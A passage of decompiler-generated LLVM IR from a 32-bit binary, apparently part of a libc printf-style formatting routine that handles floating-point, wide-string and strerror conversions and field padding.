  %v13_805cc69 = icmp slt i32 %v2_805cc69, 0
  store i1 %v13_805cc69, i1* %sf.global-to-local, align 1
  %v2_805cc6b = or i1 %v7_805cc69, %v12_805cc69
  br i1 %v2_805cc6b, label %dec_label_pc_805cc6d, label %dec_label_pc_805cc7d

dec_label_pc_805cc6d:                             ; preds = %dec_label_pc_805cc69
  %v1_805cc6d = inttoptr i32 %v0_805cc7d to i8*
  %v2_805cc6d = load i8, i8* %v1_805cc6d, align 1
  %v3_805cc6d = add i8 %v2_805cc6d, -48
  %v8_805cc6d = icmp eq i8 %v3_805cc6d, 0
  %v9_805cc6d = icmp slt i8 %v3_805cc6d, 0
  store i1 %v9_805cc6d, i1* %sf.global-to-local, align 1
  store i32 1, i32* %ecx.global-to-local, align 4
  br i1 %v8_805cc6d, label %dec_label_pc_805cc7d, label %dec_label_pc_805cc77

dec_label_pc_805cc77:                             ; preds = %dec_label_pc_805cc6d
  %v1_805cc77 = add i32 %v2_805cc3b, 128
  store i32 %v1_805cc77, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805cc7d

dec_label_pc_805cc7d:                             ; preds = %dec_label_pc_805cc69, %dec_label_pc_805cc6d, %dec_label_pc_805cc64, %dec_label_pc_805cc2b, %dec_label_pc_805cc5d, %dec_label_pc_805cc77
  %v0_805ccb6 = phi i32 [ %v3_805cc42, %dec_label_pc_805cc69 ], [ 1, %dec_label_pc_805cc6d ], [ %v3_805cc42, %dec_label_pc_805cc64 ], [ %v3_805cc42, %dec_label_pc_805cc2b ], [ %v3_805cc42, %dec_label_pc_805cc5d ], [ %v1_805cc77, %dec_label_pc_805cc77 ]
  %v1_805cc7d = inttoptr i32 %v0_805cc7d to i8*
  %v2_805cc7d = load i8, i8* %v1_805cc7d, align 1
  %v3_805cc7d = add i8 %v2_805cc7d, -48
  %v8_805cc7d = icmp eq i8 %v3_805cc7d, 0
  %v9_805cc7d = icmp slt i8 %v3_805cc7d, 0
  store i1 %v9_805cc7d, i1* %sf.global-to-local, align 1
  %v1_805cc80 = icmp eq i1 %v8_805cc7d, false
  br i1 %v1_805cc80, label %dec_label_pc_805ccae, label %dec_label_pc_805cc82

dec_label_pc_805cc82:                             ; preds = %dec_label_pc_805cc7d
  %v0_805cc82 = load i32, i32* @ebp, align 4
  %v1_805cc82 = add i32 %v0_805cc82, -6
  %v6_805cc82 = sub i32 5, %v0_805cc82
  %v7_805cc82 = and i32 %v6_805cc82, %v0_805cc82
  %v8_805cc82 = icmp slt i32 %v7_805cc82, 0
  %v10_805cc82 = icmp slt i32 %v1_805cc82, 0
  store i32 11, i32* %eax.global-to-local, align 4
  %v2_805cc8a = icmp eq i1 %v10_805cc82, %v8_805cc82
  %v5_805cc8a = select i1 %v2_805cc8a, i32 11, i32 %v0_805cc82
  store i32 %v5_805cc8a, i32* @ebp, align 4
  %v1_805cc8d = add i32 %v0_805cc8d, 48
  %v2_805cc8d = inttoptr i32 %v1_805cc8d to i32*
  %v3_805cc8d = load i32, i32* %v2_805cc8d, align 4
  %v4_805cc8d = add i32 %v3_805cc8d, -1
  %v12_805cc8d = icmp eq i32 %v4_805cc8d, 0
  %v13_805cc8d = icmp slt i32 %v4_805cc8d, 0
  store i1 %v13_805cc8d, i1* %sf.global-to-local, align 1
  %v1_805cc92 = icmp eq i1 %v12_805cc8d, false
  br i1 %v1_805cc92, label %dec_label_pc_805cca3, label %dec_label_pc_805cc94

dec_label_pc_805cc94:                             ; preds = %dec_label_pc_805cc82
  store i32 5, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_806d8ec.648 to i32), i32* @edi, align 4
  br label %dec_label_pc_805ce2d

dec_label_pc_805cca3:                             ; preds = %dec_label_pc_805cc82
  %v1_805cca3 = icmp eq i32 %v0_805ccb6, 0
  %v2_805cca3 = icmp slt i32 %v0_805ccb6, 0
  store i1 %v2_805cca3, i1* %sf.global-to-local, align 1
  %v1_805cca5 = icmp eq i1 %v1_805cca3, false
  br i1 %v1_805cca5, label %dec_label_pc_805ccae, label %dec_label_pc_805cca7

dec_label_pc_805cca7:                             ; preds = %dec_label_pc_805cca3
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_805ce2d

dec_label_pc_805ccae:                             ; preds = %dec_label_pc_805cca3, %dec_label_pc_805cc7d
  %v2_805ccae = sub i32 %v0_805ccb6, %v1_805cc3d
  %v7_805ccae = icmp ult i32 %v0_805ccb6, %v1_805cc3d
  %v12_805ccae = icmp eq i32 %v2_805ccae, 0
  %v13_805ccae = icmp slt i32 %v2_805ccae, 0
  store i1 %v13_805ccae, i1* %sf.global-to-local, align 1
  %v2_805ccb0 = or i1 %v7_805ccae, %v12_805ccae
  br i1 %v2_805ccb0, label %dec_label_pc_805ce2d, label %dec_label_pc_805ccb6

dec_label_pc_805ccb6:                             ; preds = %dec_label_pc_805ccae
  store i1 %v13_805ccae, i1* %sf.global-to-local, align 1
  store i32 %v2_805ccae, i32* @ebx, align 4
  br label %dec_label_pc_805ce47

dec_label_pc_805ccbf:                             ; preds = %dec_label_pc_805cb52
  %v1_805ccbf = add i32 %v3_805cb24, -15
  %v5_805ccbf = icmp ult i32 %v3_805cb24, 15
  %v9_805ccbf = icmp eq i32 %v1_805ccbf, 0
  %v10_805ccbf = icmp slt i32 %v1_805ccbf, 0
  store i1 %v10_805ccbf, i1* %sf.global-to-local, align 1
  %v2_805ccc2 = or i1 %v5_805ccbf, %v9_805ccbf
  br i1 %v2_805ccc2, label %dec_label_pc_805ccc4, label %dec_label_pc_805cd09

dec_label_pc_805ccc4:                             ; preds = %dec_label_pc_805ccbf
  %v1_805ccc4 = add i32 %v0_805cb24.lcssa, 33
  %v2_805ccc4 = inttoptr i32 %v1_805ccc4 to i8*
  %v3_805ccc4 = load i8, i8* %v2_805ccc4, align 1
  %v4_805ccc4 = and i8 %v3_805ccc4, 8
  %v5_805ccc4 = icmp eq i8 %v4_805ccc4, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_805ccc9 = add i32 %v0_805cb24.lcssa, 344
  %v2_805ccc9 = inttoptr i32 %v1_805ccc9 to i32*
  %v3_805ccc9 = load i32, i32* %v2_805ccc9, align 4
  store i32 %v3_805ccc9, i32* %edx.global-to-local, align 4
  br i1 %v5_805ccc4, label %dec_label_pc_805ccd6, label %dec_label_pc_805ccd2

dec_label_pc_805ccd2:                             ; preds = %dec_label_pc_805ccc4
  %v1_805ccd2 = inttoptr i32 %v3_805ccc9 to x86_fp80*
  %v2_805ccd2 = load x86_fp80, x86_fp80* %v1_805ccd2, align 4
  br label %dec_label_pc_805ccd8

dec_label_pc_805ccd6:                             ; preds = %dec_label_pc_805ccc4
  %v1_805ccd6 = inttoptr i32 %v3_805ccc9 to double*
  %v2_805ccd6 = load double, double* %v1_805ccd6, align 4
  %v3_805ccd6 = fpext double %v2_805ccd6 to x86_fp80
  br label %dec_label_pc_805ccd8

dec_label_pc_805ccd8:                             ; preds = %dec_label_pc_805ccd2, %dec_label_pc_805ccd6
  %storemerge6 = phi x86_fp80 [ %v2_805ccd2, %dec_label_pc_805ccd2 ], [ %v3_805ccd6, %dec_label_pc_805ccd6 ]
  store x86_fp80 %storemerge6, x86_fp80* %st0.global-to-local, align 4
  %v0_805ccd8 = load i32, i32* @esi, align 4
  %v2_805ccd8 = add i32 %v0_805cb24.lcssa, -4
  %v3_805ccd8 = inttoptr i32 %v2_805ccd8 to i32*
  store i32 %v0_805ccd8, i32* %v3_805ccd8, align 4
  %v0_805ccd9 = load i32, i32* @esi, align 4
  %v2_805ccd9 = add i32 %v0_805cb24.lcssa, -8
  %v3_805ccd9 = inttoptr i32 %v2_805ccd9 to i32*
  store i32 %v0_805ccd9, i32* %v3_805ccd9, align 4
  %v1_805ccda = add i32 %v0_805cb24.lcssa, -12
  %v2_805ccda = inttoptr i32 %v1_805ccda to i32*
  store i32 134597018, i32* %v2_805ccda, align 4
  %v1_805ccdf = add i32 %v0_805cb24.lcssa, 20
  store i32 %v1_805ccdf, i32* %eax.global-to-local, align 4
  %v2_805cce3 = add i32 %v0_805cb24.lcssa, -16
  %v3_805cce3 = inttoptr i32 %v2_805cce3 to i32*
  store i32 %v1_805ccdf, i32* %v3_805cce3, align 4
  %v1_805cce4 = add i32 %v0_805cb24.lcssa, -28
  %v10_805cce4 = icmp slt i32 %v1_805cce4, 0
  store i1 %v10_805cce4, i1* %sf.global-to-local, align 1
  %v1_805cce7 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_805cce7 = inttoptr i32 %v1_805cce4 to x86_fp80*
  store x86_fp80 %v1_805cce7, x86_fp80* %v3_805cce7, align 4
  %v1_805ccea = add i32 %v0_805cb24.lcssa, 368
  %v2_805ccea = inttoptr i32 %v1_805ccea to i32*
  %v3_805ccea = load i32, i32* %v2_805ccea, align 4
  %v5_805ccea = add i32 %v0_805cb24.lcssa, -32
  %v6_805ccea = inttoptr i32 %v5_805ccea to i32*
  store i32 %v3_805ccea, i32* %v6_805ccea, align 4
  %v0_805ccf1 = call i32 @_fpmaxtostr()
  store i32 %v0_805ccf1, i32* %eax.global-to-local, align 4
  %v0_805ccf6 = load i32, i32* @esp, align 4
  %v1_805ccf6 = add i32 %v0_805ccf6, 32
  %v2_805ccf9 = icmp slt i32 %v0_805ccf1, 0
  store i1 %v2_805ccf9, i1* %sf.global-to-local, align 1
  br i1 %v2_805ccf9, label %dec_label_pc_805cfa7, label %dec_label_pc_805cd01

dec_label_pc_805cd01:                             ; preds = %dec_label_pc_805ccd8
  %v1_805cd01 = inttoptr i32 %v1_805ccf6 to i32*
  %v2_805cd01 = load i32, i32* %v1_805cd01, align 4
  %v4_805cd01 = add i32 %v2_805cd01, %v0_805ccf1
  %v15_805cd01 = icmp slt i32 %v4_805cd01, 0
  store i1 %v15_805cd01, i1* %sf.global-to-local, align 1
  store i32 %v4_805cd01, i32* %v1_805cd01, align 4
  %v0_805cf94.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805cf94

dec_label_pc_805cd09:                             ; preds = %dec_label_pc_805ccbf
  %v1_805cd09 = add i32 %v3_805cb24, -17
  %v5_805cd09 = icmp ult i32 %v3_805cb24, 17
  %v9_805cd09 = icmp eq i32 %v1_805cd09, 0
  %v10_805cd09 = icmp slt i32 %v1_805cd09, 0
  store i1 %v10_805cd09, i1* %sf.global-to-local, align 1
  %v2_805cd0c = or i1 %v5_805cd09, %v9_805cd09
  br i1 %v2_805cd0c, label %dec_label_pc_805cd12, label %dec_label_pc_805cda6

dec_label_pc_805cd12:                             ; preds = %dec_label_pc_805cd09
  %v1_805cd12 = add i32 %v0_805cb24.lcssa, 332
  %v2_805cd12 = inttoptr i32 %v1_805cd12 to i32*
  store i32 0, i32* %v2_805cd12, align 4
  %v0_805cd1d = load i32, i32* @esp, align 4
  %v1_805cd1d = add i32 %v0_805cd1d, 344
  %v2_805cd1d = inttoptr i32 %v1_805cd1d to i32*
  %v3_805cd1d = load i32, i32* %v2_805cd1d, align 4
  store i32 %v3_805cd1d, i32* %edx.global-to-local, align 4
  %v1_805cd24 = icmp eq i1 %v9_805cd09, false
  br i1 %v1_805cd24, label %dec_label_pc_805cd76, label %dec_label_pc_805cd26

dec_label_pc_805cd26:                             ; preds = %dec_label_pc_805cd12
  %v1_805cd26 = inttoptr i32 %v3_805cd1d to i32*
  %v2_805cd26 = load i32, i32* %v1_805cd26, align 4
  store i32 %v2_805cd26, i32* %eax.global-to-local, align 4
  %v1_805cd28 = icmp eq i32 %v2_805cd26, 0
  %v2_805cd28 = icmp slt i32 %v2_805cd26, 0
  store i1 %v2_805cd28, i1* %sf.global-to-local, align 1
  %v2_805cd2a = add i32 %v0_805cd1d, 340
  %v3_805cd2a = inttoptr i32 %v2_805cd2a to i32*
  store i32 %v2_805cd26, i32* %v3_805cd2a, align 4
  br i1 %v1_805cd28, label %dec_label_pc_805ce31, label %dec_label_pc_805cd37

dec_label_pc_805cd37:                             ; preds = %dec_label_pc_805cd26
  %v0_805cd37 = load i32, i32* @esp, align 4
  %v1_805cd37 = add i32 %v0_805cd37, 20
  %v2_805cd37 = inttoptr i32 %v1_805cd37 to i32*
  %v3_805cd37 = load i32, i32* %v2_805cd37, align 4
  %v1_805cd3e = add i32 %v0_805cd37, 340
  store i32 %v1_805cd3e, i32* %ecx.global-to-local, align 4
  %v2_805cd45 = icmp slt i32 %v3_805cd37, 0
  store i1 %v2_805cd45, i1* %sf.global-to-local, align 1
  %v1_805cd47 = icmp eq i1 %v2_805cd45, false
  %v4_805cd47 = select i1 %v1_805cd47, i32 %v3_805cd37, i32 -1
  store i32 %v4_805cd47, i32* %edx.global-to-local, align 4
  %v1_805cd4a = add i32 %v0_805cd37, 332
  store i32 %v1_805cd4a, i32* %eax.global-to-local, align 4
  %v2_805cd51 = add i32 %v0_805cd37, -4
  %v3_805cd51 = inttoptr i32 %v2_805cd51 to i32*
  store i32 %v1_805cd4a, i32* %v3_805cd51, align 4
  %v0_805cd52 = load i32, i32* %edx.global-to-local, align 4
  %v2_805cd52 = add i32 %v0_805cd37, -8
  %v3_805cd52 = inttoptr i32 %v2_805cd52 to i32*
  store i32 %v0_805cd52, i32* %v3_805cd52, align 4
  %v0_805cd53 = load i32, i32* %ecx.global-to-local, align 4
  %v2_805cd53 = add i32 %v0_805cd37, -12
  %v3_805cd53 = inttoptr i32 %v2_805cd53 to i32*
  store i32 %v0_805cd53, i32* %v3_805cd53, align 4
  %v0_805cd54 = load i32, i32* %ecx.global-to-local, align 4
  %v2_805cd54 = add i32 %v0_805cd37, -16
  %v3_805cd54 = inttoptr i32 %v2_805cd54 to i32*
  store i32 %v0_805cd54, i32* %v3_805cd54, align 4
  %v0_805cd55 = call i32 @__GI_wcsrtombs()
  store i32 %v0_805cd55, i32* %eax.global-to-local, align 4
  %v0_805cd5a = load i32, i32* @esp, align 4
  %v1_805cd5a = add i32 %v0_805cd5a, 16
  %v1_805cd5d = add i32 %v0_805cd55, 1
  %v10_805cd5d = icmp eq i32 %v1_805cd5d, 0
  %v11_805cd5d = icmp slt i32 %v1_805cd5d, 0
  store i1 %v11_805cd5d, i1* %sf.global-to-local, align 1
  store i32 %v0_805cd55, i32* @esi, align 4
  br i1 %v10_805cd5d, label %dec_label_pc_805cfa7, label %dec_label_pc_805cd68

dec_label_pc_805cd68:                             ; preds = %dec_label_pc_805cd37
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_805ce42

dec_label_pc_805cd76:                             ; preds = %dec_label_pc_805cd12
  %v0_805cd76 = load i32, i32* @ebx, align 4
  %v2_805cd76 = add i32 %v0_805cd1d, -4
  %v3_805cd76 = inttoptr i32 %v2_805cd76 to i32*
  store i32 %v0_805cd76, i32* %v3_805cd76, align 4
  %v1_805cd77 = add i32 %v0_805cd1d, 332
  store i32 %v1_805cd77, i32* %eax.global-to-local, align 4
  %v2_805cd7e = add i32 %v0_805cd1d, -8
  %v3_805cd7e = inttoptr i32 %v2_805cd7e to i32*
  store i32 %v1_805cd77, i32* %v3_805cd7e, align 4
  %v0_805cd7f = load i32, i32* %edx.global-to-local, align 4
  %v1_805cd7f = inttoptr i32 %v0_805cd7f to i32*
  %v2_805cd7f = load i32, i32* %v1_805cd7f, align 4
  %v4_805cd7f = add i32 %v0_805cd1d, -12
  %v5_805cd7f = inttoptr i32 %v4_805cd7f to i32*
  store i32 %v2_805cd7f, i32* %v5_805cd7f, align 4
  %v1_805cd81 = add i32 %v0_805cd1d, 204
  store i32 %v1_805cd81, i32* @edi, align 4
  %v2_805cd88 = add i32 %v0_805cd1d, -16
  %v3_805cd88 = inttoptr i32 %v2_805cd88 to i32*
  store i32 %v1_805cd81, i32* %v3_805cd88, align 4
  %v0_805cd89 = call i32 @__GI_wcrtomb()
  store i32 %v0_805cd89, i32* %eax.global-to-local, align 4
  %v0_805cd8e = load i32, i32* @esp, align 4
  %v1_805cd8e = add i32 %v0_805cd8e, 16
  %v1_805cd91 = add i32 %v0_805cd89, 1
  %v10_805cd91 = icmp eq i32 %v1_805cd91, 0
  %v11_805cd91 = icmp slt i32 %v1_805cd91, 0
  store i1 %v11_805cd91, i1* %sf.global-to-local, align 1
  store i32 %v0_805cd89, i32* @esi, align 4
  br i1 %v10_805cd91, label %dec_label_pc_805cfa7, label %dec_label_pc_805cd9c

dec_label_pc_805cd9c:                             ; preds = %dec_label_pc_805cd76
  %v2_805cd9c = add i32 %v0_805cd89, 220
  %v3_805cd9c = add i32 %v2_805cd9c, %v0_805cd8e
  %v4_805cd9c = inttoptr i32 %v3_805cd9c to i8*
  store i8 0, i8* %v4_805cd9c, align 1
  br label %dec_label_pc_805cdd4

dec_label_pc_805cda6:                             ; preds = %dec_label_pc_805cd09
  %v1_805cda6 = add i32 %v3_805cb24, -19
  %v5_805cda6 = icmp ult i32 %v3_805cb24, 19
  %v9_805cda6 = icmp eq i32 %v1_805cda6, 0
  %v10_805cda6 = icmp slt i32 %v1_805cda6, 0
  store i1 %v10_805cda6, i1* %sf.global-to-local, align 1
  %v2_805cda9 = or i1 %v5_805cda6, %v9_805cda6
  br i1 %v2_805cda9, label %dec_label_pc_805cdab, label %dec_label_pc_805ce03

dec_label_pc_805cdab:                             ; preds = %dec_label_pc_805cda6
  %v1_805cdab = add i32 %v0_805cb24.lcssa, 344
  %v2_805cdab = inttoptr i32 %v1_805cdab to i32*
  %v3_805cdab = load i32, i32* %v2_805cdab, align 4
  store i32 %v3_805cdab, i32* %edx.global-to-local, align 4
  %v1_805cdb2 = icmp eq i1 %v9_805cda6, false
  %v1_805cddd = inttoptr i32 %v3_805cdab to i32*
  %v2_805cddd = load i32, i32* %v1_805cddd, align 4
  br i1 %v1_805cdb2, label %dec_label_pc_805cddd, label %dec_label_pc_805cdb4

dec_label_pc_805cdb4:                             ; preds = %dec_label_pc_805cdab
  store i32 %v2_805cddd, i32* @edi, align 4
  %v1_805cdb6 = icmp eq i32 %v2_805cddd, 0
  %v2_805cdb6 = icmp slt i32 %v2_805cddd, 0
  store i1 %v2_805cdb6, i1* %sf.global-to-local, align 1
  br i1 %v1_805cdb6, label %dec_label_pc_805ce31, label %dec_label_pc_805cdba

dec_label_pc_805cdba:                             ; preds = %dec_label_pc_805cdb4, %dec_label_pc_805ce0c
  %v1_805cdc1 = phi i32 [ %v0_805cb24.lcssa, %dec_label_pc_805cdb4 ], [ %v1_805ce26, %dec_label_pc_805ce0c ]
  %v1_805cdba = add i32 %v1_805cdc1, 20
  %v2_805cdba = inttoptr i32 %v1_805cdba to i32*
  %v3_805cdba = load i32, i32* %v2_805cdba, align 4
  store i32 %v3_805cdba, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v2_805cdc1 = add i32 %v1_805cdc1, -4
  %v3_805cdc1 = inttoptr i32 %v2_805cdc1 to i32*
  store i32 %v3_805cb24, i32* %v3_805cdc1, align 4
  %v2_805cdc2 = add i32 %v1_805cdc1, -8
  %v3_805cdc2 = inttoptr i32 %v2_805cdc2 to i32*
  store i32 %v3_805cb24, i32* %v3_805cdc2, align 4
  %v2_805cdc3 = icmp slt i32 %v3_805cdba, 0
  store i1 %v2_805cdc3, i1* %sf.global-to-local, align 1
  %v1_805cdc5 = icmp eq i1 %v2_805cdc3, false
  %v2_805cdc5 = load i32, i32* %eax.global-to-local, align 4
  %v4_805cdc5 = select i1 %v1_805cdc5, i32 %v3_805cdba, i32 %v2_805cdc5
  store i32 %v4_805cdc5, i32* %eax.global-to-local, align 4
  %v2_805cdc8 = add i32 %v1_805cdc1, -12
  %v3_805cdc8 = inttoptr i32 %v2_805cdc8 to i32*
  store i32 %v4_805cdc5, i32* %v3_805cdc8, align 4
  %v0_805cdc9 = load i32, i32* @edi, align 4
  %v2_805cdc9 = add i32 %v1_805cdc1, -16
  %v3_805cdc9 = inttoptr i32 %v2_805cdc9 to i32*
  store i32 %v0_805cdc9, i32* %v3_805cdc9, align 4
  %v0_805cdca = call i32 @strnlen()
  store i32 %v0_805cdca, i32* %eax.global-to-local, align 4
  %v0_805cdcf = load i32, i32* @esp, align 4
  %v1_805cdcf = add i32 %v0_805cdcf, 16
  %v7_805cdcf = icmp slt i32 %v1_805cdcf, 0
  store i1 %v7_805cdcf, i1* %sf.global-to-local, align 1
  store i32 %v0_805cdca, i32* @esi, align 4
  br label %dec_label_pc_805cdd4

dec_label_pc_805cdd4:                             ; preds = %dec_label_pc_805cd9c, %dec_label_pc_805cdba
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_805ce42

dec_label_pc_805cddd:                             ; preds = %dec_label_pc_805cdab
  store i32 %v2_805cddd, i32* %eax.global-to-local, align 4
  store i32 1, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v1_805cdeb = add i32 %v0_805cb24.lcssa, 204
  store i32 %v1_805cdeb, i32* @edi, align 4
  %v1_805cdf2 = add i32 %v0_805cb24.lcssa, 205
  %v2_805cdf2 = inttoptr i32 %v1_805cdf2 to i8*
  store i8 0, i8* %v2_805cdf2, align 1
  %v0_805cdfa = load i32, i32* %eax.global-to-local, align 4
  %v1_805cdfa = trunc i32 %v0_805cdfa to i8
  %v2_805cdfa = load i32, i32* @esp, align 4
  %v3_805cdfa = add i32 %v2_805cdfa, 204
  %v4_805cdfa = inttoptr i32 %v3_805cdfa to i8*
  store i8 %v1_805cdfa, i8* %v4_805cdfa, align 1
  br label %dec_label_pc_805ce42

dec_label_pc_805ce03:                             ; preds = %dec_label_pc_805cda6
  %v1_805ce03 = add i32 %v3_805cb24, -20
  %v9_805ce03 = icmp eq i32 %v1_805ce03, 0
  %v10_805ce03 = icmp slt i32 %v1_805ce03, 0
  store i1 %v10_805ce03, i1* %sf.global-to-local, align 1
  %v1_805ce06 = icmp eq i1 %v9_805ce03, false
  br i1 %v1_805ce06, label %dec_label_pc_805cfa7, label %dec_label_pc_805ce0c

dec_label_pc_805ce0c:                             ; preds = %dec_label_pc_805ce03
  %v0_805ce0c = load i32, i32* %stack_var_-364, align 4
  %v1_805ce0c = call i32 @__errno_location(i32 %v0_805ce0c)
  store i32 %v1_805ce0c, i32* %eax.global-to-local, align 4
  %v0_805ce11 = load i32, i32* @edx, align 4
  %v1_805ce11 = load i32, i32* @esp, align 4
  %v2_805ce11 = add i32 %v1_805ce11, -4
  %v3_805ce11 = inttoptr i32 %v2_805ce11 to i32*
  store i32 %v0_805ce11, i32* %v3_805ce11, align 4
  %v1_805ce12 = add i32 %v1_805ce11, -8
  %v2_805ce12 = inttoptr i32 %v1_805ce12 to i32*
  store i32 128, i32* %v2_805ce12, align 4
  %v1_805ce17 = add i32 %v1_805ce11, 204
  store i32 %v1_805ce17, i32* %edx.global-to-local, align 4
  %v2_805ce1e = add i32 %v1_805ce11, -12
  %v3_805ce1e = inttoptr i32 %v2_805ce1e to i32*
  store i32 %v1_805ce17, i32* %v3_805ce1e, align 4
  %v1_805ce1f = inttoptr i32 %v1_805ce0c to i32*
  %v2_805ce1f = load i32, i32* %v1_805ce1f, align 4
  %v4_805ce1f = add i32 %v1_805ce11, -16
  %v5_805ce1f = inttoptr i32 %v4_805ce1f to i32*
  store i32 %v2_805ce1f, i32* %v5_805ce1f, align 4
  %v0_805ce21 = load i32, i32* %stack_var_-364, align 4
  %v3_805ce21 = call i32 @__GI___glibc_strerror_r(i32 %v0_805ce21, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_805ce21, i32* %eax.global-to-local, align 4
  %v0_805ce26 = load i32, i32* @esp, align 4
  %v1_805ce26 = add i32 %v0_805ce26, 16
  %v7_805ce26 = icmp slt i32 %v1_805ce26, 0
  store i1 %v7_805ce26, i1* %sf.global-to-local, align 1
  store i32 %v3_805ce21, i32* @edi, align 4
  br label %dec_label_pc_805cdba

dec_label_pc_805ce2d:                             ; preds = %dec_label_pc_805ccae, %dec_label_pc_805cca7, %dec_label_pc_805cc94
  %v0_805ce4a36 = phi i32 [ %v1_805cc3d, %dec_label_pc_805ccae ], [ 0, %dec_label_pc_805cca7 ], [ 5, %dec_label_pc_805cc94 ]
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805ce47

dec_label_pc_805ce31:                             ; preds = %dec_label_pc_805cdb4, %dec_label_pc_805cd26
  store i32 6, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_806d8f2.649 to i32), i32* @edi, align 4
  br label %dec_label_pc_805ce42

dec_label_pc_805ce42:                             ; preds = %dec_label_pc_805cddd, %dec_label_pc_805cdd4, %dec_label_pc_805cd68, %dec_label_pc_805ce31
  %v0_805ce42 = load i32, i32* @esp, align 4
  %v1_805ce42 = add i32 %v0_805ce42, 7
  %v2_805ce42 = inttoptr i32 %v1_805ce42 to i8*
  store i8 32, i8* %v2_805ce42, align 1
  %v0_805ce4a.pre = load i32, i32* @esi, align 4
  %v1_805ce4a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805ce47

dec_label_pc_805ce47:                             ; preds = %dec_label_pc_805ce2d, %dec_label_pc_805ccb6, %dec_label_pc_805ce42
  %v1_805ce4a = phi i32 [ 0, %dec_label_pc_805ce2d ], [ %v2_805ccae, %dec_label_pc_805ccb6 ], [ %v1_805ce4a.pre, %dec_label_pc_805ce42 ]
  %v0_805ce4a = phi i32 [ %v0_805ce4a36, %dec_label_pc_805ce2d ], [ %v1_805cc3d, %dec_label_pc_805ccb6 ], [ %v0_805ce4a.pre, %dec_label_pc_805ce42 ]
  %v0_805ce47 = load i32, i32* @ebp, align 4
  %v1_805ce47 = add i32 %v0_805ce47, -11
  %v9_805ce47 = icmp eq i32 %v1_805ce47, 0
  %v10_805ce47 = icmp slt i32 %v1_805ce47, 0
  store i1 %v10_805ce47, i1* %sf.global-to-local, align 1
  %v2_805ce4a = add i32 %v0_805ce4a, %v1_805ce4a
  store i32 %v2_805ce4a, i32* @edx, align 4
  br i1 %v9_805ce47, label %dec_label_pc_805ce5b, label %dec_label_pc_805ce4f

dec_label_pc_805ce4f:                             ; preds = %dec_label_pc_805ce47
  %v1_805ce51 = add i32 %v0_805ce47, -5
  %v6_805ce51 = sub i32 4, %v0_805ce47
  %v7_805ce51 = and i32 %v6_805ce51, %v0_805ce47
  %v8_805ce51 = icmp slt i32 %v7_805ce51, 0
  %v9_805ce51 = icmp eq i32 %v1_805ce51, 0
  %v10_805ce51 = icmp slt i32 %v1_805ce51, 0
  store i1 %v10_805ce51, i1* %sf.global-to-local, align 1
  %v3_805ce54 = icmp eq i1 %v10_805ce51, %v8_805ce51
  %v4_805ce54 = icmp eq i1 %v9_805ce51, false
  %v5_805ce54 = and i1 %v4_805ce54, %v3_805ce54
  %v6_805ce54 = zext i1 %v5_805ce54 to i32
  store i32 %v6_805ce54, i32* %eax.global-to-local, align 4
  %v2_805ce57 = add i32 %v2_805ce4a, 1
  %v3_805ce57 = add i32 %v2_805ce57, %v6_805ce54
  store i32 %v3_805ce57, i32* @edx, align 4
  br label %dec_label_pc_805ce5b

dec_label_pc_805ce5b:                             ; preds = %dec_label_pc_805ce47, %dec_label_pc_805ce4f
  %v0_805ce5b = load i32, i32* @esp, align 4
  %v1_805ce5b = add i32 %v0_805ce5b, 24
  %v2_805ce5b = inttoptr i32 %v1_805ce5b to i32*
  %v3_805ce5b = load i32, i32* %v2_805ce5b, align 4
  store i32 %v3_805ce5b, i32* %eax.global-to-local, align 4
  %v1_805ce5f = add i32 %v0_805ce5b, 8
  %v2_805ce5f = inttoptr i32 %v1_805ce5f to i32*
  store i32 0, i32* %v2_805ce5f, align 4
  %v0_805ce67 = load i32, i32* %eax.global-to-local, align 4
  %v1_805ce67 = load i32, i32* @edx, align 4
  %v2_805ce67 = sub i32 %v0_805ce67, %v1_805ce67
  %v7_805ce67 = icmp ult i32 %v0_805ce67, %v1_805ce67
  %v12_805ce67 = icmp eq i32 %v2_805ce67, 0
  %v13_805ce67 = icmp slt i32 %v2_805ce67, 0
  store i1 %v13_805ce67, i1* %sf.global-to-local, align 1
  %v2_805ce69 = or i1 %v7_805ce67, %v12_805ce67
  br i1 %v2_805ce69, label %dec_label_pc_805ce71, label %dec_label_pc_805ce6b

dec_label_pc_805ce6b:                             ; preds = %dec_label_pc_805ce5b
  store i1 %v13_805ce67, i1* %sf.global-to-local, align 1
  store i32 %v2_805ce67, i32* %eax.global-to-local, align 4
  %v1_805ce6d = load i32, i32* @esp, align 4
  %v2_805ce6d = add i32 %v1_805ce6d, 8
  %v3_805ce6d = inttoptr i32 %v2_805ce6d to i32*
  store i32 %v2_805ce67, i32* %v3_805ce6d, align 4
  %v0_805ce75.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805ce71

dec_label_pc_805ce71:                             ; preds = %dec_label_pc_805ce5b, %dec_label_pc_805ce6b
  %v0_805ce75 = phi i32 [ %v1_805ce67, %dec_label_pc_805ce5b ], [ %v0_805ce75.pre, %dec_label_pc_805ce6b ]
  %v0_805ce71 = load i32, i32* @esp, align 4
  %v1_805ce71 = add i32 %v0_805ce71, 8
  %v2_805ce71 = inttoptr i32 %v1_805ce71 to i32*
  %v3_805ce71 = load i32, i32* %v2_805ce71, align 4
  store i32 %v3_805ce71, i32* @ecx, align 4
